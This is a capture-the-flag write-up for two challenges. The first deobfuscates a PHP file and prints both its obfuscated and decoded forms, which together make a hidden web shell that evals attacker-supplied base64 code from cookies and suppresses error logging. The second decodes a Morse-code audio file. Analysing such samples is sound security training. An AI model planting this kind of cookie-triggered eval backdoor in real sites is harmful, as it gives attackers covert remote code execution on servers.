# Web Challenge : 50 Point
- The Challenge is a [zip](https://github.com/X-Vector/CTF/blob/master/Bsides/c99.zip) file Which Contain a php code 
``` 
<?php
$kyo1="JGM9J2NvdW50JzskYT0kX0NPT0tecJRTtecpZihyZecXecNecldCgkYSeck9PSecdecmbCcgJiYgJGMecoJGEpPjMpe2luaec";
$kyo3="zectldmFsecKGecJhc2Uec2NF9kZWNvZGUocHJlZ19ecyZXecBsYWNlKGecFycmF5KCcvW15cdz1cc1ec0vJywnL1xeczLycpLCBhcnJ";
$gj = "bcoxacoxse64cox_coxdcoxecoxccoxode";
$kyo4="heecSgnJywnKycpLCBqb2luKGecFyeccmF5X3NsaWNlKCecRhLCRjKCRhKS0zKSkpKSeckec7ZWNobyAnPC8nLiRrLiecc+Jzt9";
$iuq = "str_replace";
$kyo2="V9zZecXQoJ2Vyeccm9yX2xvZycecsICcvecZGV2L251bGwnKTskecaecz0nYWd7aGlkZGVuecX2eclecuX3BocH0nO2VjecaG8gJzwnLeciRecrLic+J";
$gj = $iuq("cox", "", $gj);
eval($gj($iuq("ec", "", $kyo1.$kyo2.$kyo3.$kyo4)));
?>
``` 
- first the variable `$iuq` containe a php build in function which is used to replcae any this words `ec` in this variables `$kyo1,$kyo2,$kyo3,$kyo4` with nothing then when excute the code the output will be 

```
JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSk9PSdmbCcgJiYgJGMoJGEpPjMpe2luaV9zZXQoJ2Vycm9yX2xvZycsICcvZGV2L251bGwnKTskaz0nYWd7aGlkZGVuX2luX3BocH0nO2VjaG8gJzwnLiRrLic+JztldmFsKGJhc2U2NF9kZWNvZGUocHJlZ19yZXBsYWNlKGFycmF5KCcvW15cdz1cc10vJywnL1xzLycpLCBhcnJheSgnJywnKycpLCBqb2luKGFycmF5X3NsaWNlKCRhLCRjKCRhKS0zKSkpKSk7ZWNobyAnPC8nLiRrLic+Jzt9
```
- decode it with base64 then the output will be 
```
$c='count';$a=$_COOKIE;if(reset($a)=='fl' && $c($a)>3){ini_set('error_log', '/dev/null');$k='ag{hidden_in_php}';echo '<'.$k.'>';eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));echo '</'.$k.'>';}
```
- you will see that variable `$a` is `fl` and variable `$k` is `ag{hidden_in_php}` so your flag is `flag{hidden_in_php}`


# Crypto Challenge : 50 Point 
- The Challenge is a [mp3](https://github.com/X-Vector/CTF/blob/master/Bsides/abusing.mp3) file Which This Sound Like Morse code 
- Go to this [website](https://morsecode.scphillips.com/labs/audio-decoder-adaptive/) then upload mp3 file and you get this result
![Morse code](https://raw.githubusercontent.com/X-Vector/CTF/master/Bsides/morse.png?token=Ac-MuIyfT9F5B5lwWFnKAdTu2I1GK86Nks5cOkg0wA%3D%3D)
- We Play in This Words `ETTE L A G I N M C O D E W E T R U S T` To Get This Result `FLAGINMCODEWETRUST` Then We Submit and we get is wrong Then we add `{}_` to words to be `FLAG{IN_MCODE_TRUST}` and Flag is Correct
